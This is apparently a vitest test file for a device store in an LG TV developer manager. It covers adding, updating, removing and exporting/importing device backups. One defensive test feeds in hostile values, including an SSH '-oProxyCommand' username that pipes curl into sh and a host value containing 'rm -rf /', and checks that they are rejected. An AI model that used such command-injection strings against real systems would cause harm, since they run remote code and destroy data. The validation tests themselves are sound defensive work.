import { beforeEach, describe, expect, it } from 'vitest';
import {
  BackupError,
  addDevice,
  clearAllDevices,
  exportDevices,
  getActiveDeviceId,
  importDevices,
  listDevices,
  removeDevice,
  toTarget,
  updateDevice,
  type NewDevice,
} from './store';

const tv = (name: string): NewDevice => ({
  name,
  mode: 'devmode',
  host: '192.0.2.10',
  port: 9922,
  username: 'prisoner',
  auth: { kind: 'key', privateKey: '-----BEGIN RSA PRIVATE KEY-----\nabc\n-----END RSA PRIVATE KEY-----', passphrase: 'A1B2C3' },
});

beforeEach(async () => {
  await clearAllDevices();
});

describe('browser device store', () => {
  it('adds, lists (sorted), updates and removes devices', async () => {
    const b = await addDevice(tv('Bedroom'));
    await addDevice(tv('Living room'));
    expect((await listDevices()).map((d) => d.name)).toEqual(['Bedroom', 'Living room']);
    await updateDevice(b.id, { host: '192.0.2.11' });
    expect((await listDevices())[0]!.host).toBe('192.0.2.11');
    await removeDevice(b.id);
    expect((await listDevices()).map((d) => d.name)).toEqual(['Living room']);
  });

  it('makes the first device active and moves on when it is removed', async () => {
    const a = await addDevice(tv('A'));
    const b = await addDevice(tv('B'));
    expect(getActiveDeviceId()).toBe(a.id);
    await removeDevice(a.id);
    expect(getActiveDeviceId()).toBe(b.id);
  });

  it('round-trips export / import', async () => {
    await addDevice(tv('A'));
    const file = await exportDevices();
    await clearAllDevices();
    expect(await importDevices(JSON.parse(JSON.stringify(file)))).toBe(1);
    expect((await listDevices())[0]!.name).toBe('A');
  });

  it('rejects files that are not a device export', async () => {
    await expect(importDevices({ hello: 'world' })).rejects.toThrow();
  });

  it('refuses a hostile backup as a whole, with a clear message that does not echo secrets', async () => {
    await addDevice(tv('Good'));
    const file = JSON.parse(JSON.stringify(await exportDevices()));
    await clearAllDevices();
    const good = file.devices[0];
    const evilUser = { ...good, id: 'evil-1', name: 'Trap', username: '-oProxyCommand=sh -c "curl x|sh"' };
    const err = await importDevices({ ...file, devices: [good, evilUser] }).catch((e: unknown) => e);
    expect(err).toBeInstanceOf(BackupError);
    expect((err as Error).message).toBe('Nothing was imported: TV “Trap” in this backup has a user name that isn’t allowed. Only import backups you made yourself.');
    expect((err as Error).message).not.toContain('A1B2C3');
    expect(await listDevices()).toEqual([]);

    for (const host of ['-oProxyCommand=sh', '192.0.2.10 -p 22', 'tv;rm -rf /', 'http://192.0.2.10', '']) {
      const e = await importDevices({ ...file, devices: [{ ...good, host }] }).catch((x: unknown) => x);
      expect(e).toBeInstanceOf(BackupError);
      expect((e as Error).message).toContain('has an address that isn’t an IP address or host name');
    }
    for (const username of ['-l', 'Root', 'root user', '', 'a'.repeat(40)]) {
      await expect(importDevices({ ...file, devices: [{ ...good, username }] })).rejects.toThrow('has a user name that isn’t allowed');
    }
    expect(await listDevices()).toEqual([]);
  });

  it('accepts the addresses and user names the forms accept (and trims the address)', async () => {
    await addDevice(tv('Good'));
    const file = JSON.parse(JSON.stringify(await exportDevices()));
    await clearAllDevices();
    const good = file.devices[0];
    expect(await importDevices({ ...file, devices: [{ ...good, host: ' tv.local ', username: 'root' }] })).toBe(1);
    expect((await listDevices())[0]).toMatchObject({ host: 'tv.local', username: 'root' });
    expect(await importDevices({ ...file, devices: [{ ...good, id: 'v6', name: 'V6', host: '[2001:db8::1]', username: 'prisoner' }] })).toBe(1);
  });

  it('says so when the file is not a backup at all', async () => {
    await expect(importDevices({ format: 'something-else', devices: [] })).rejects.toThrow('That file is not an LG Dev Manager device backup.');
  });

  it('sends only connection fields to the bridge', async () => {
    const d = await addDevice({ ...tv('A'), description: 'private note' });
    expect(Object.keys(toTarget(d)).sort()).toEqual(['auth', 'host', 'port', 'username']);
  });
});
